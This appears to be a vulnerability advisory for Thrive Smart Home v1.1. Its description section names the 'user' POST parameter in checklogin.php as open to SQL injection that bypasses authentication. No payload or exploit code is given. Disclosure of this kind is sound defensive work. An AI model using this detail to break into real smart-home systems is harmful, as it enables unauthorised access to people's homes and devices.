Thrive Smart Home v1.1 SQL Injection Authentication Bypass


Vendor: Thrive
Product web page: http://www.thrivesmarthomes.com
Affected version: 1.1

Summary: As smart home technology becomes more affordable and easy to
install with services offered by Thrive Smart Homes, there are some
great options available to give your home a high-tech makeover. If the
convenience of feeding your cat or turning on your air conditioning with
a tap on your smartphone isn't enough of a reason to make the investment,
consider how conveniently you can protect your home and belongings. From
Wi-Fi-equipped smoke detectors to plugs with auto turn-offs, smart homes
with their always-on connectivity and notifications systems allow consumers
to quickly respond to the unexpected. For instance, if you install a smart
water leak and moisture monitoring device, you can set up alerts on your
phone for unusual changes in moisture and stop leaks before they cause major
flooding or mold. It's a convenient way to proactively protect your home
from costly damage, whether it's an overflowing laundry tub, a cracked
washer hose, or a leaky water heater.

Desc: The application suffers from an SQL Injection vulnerability. Input
passed through 'user' POST parameter in checklogin.php is not properly
sanitised before being returned to the user or used in SQL queries. This
can be exploited to manipulate SQL queries by injecting arbitrary SQL
code and bypass the authentication mechanism.

Tested on: Apache httpd 2.4.25 (Raspbian)
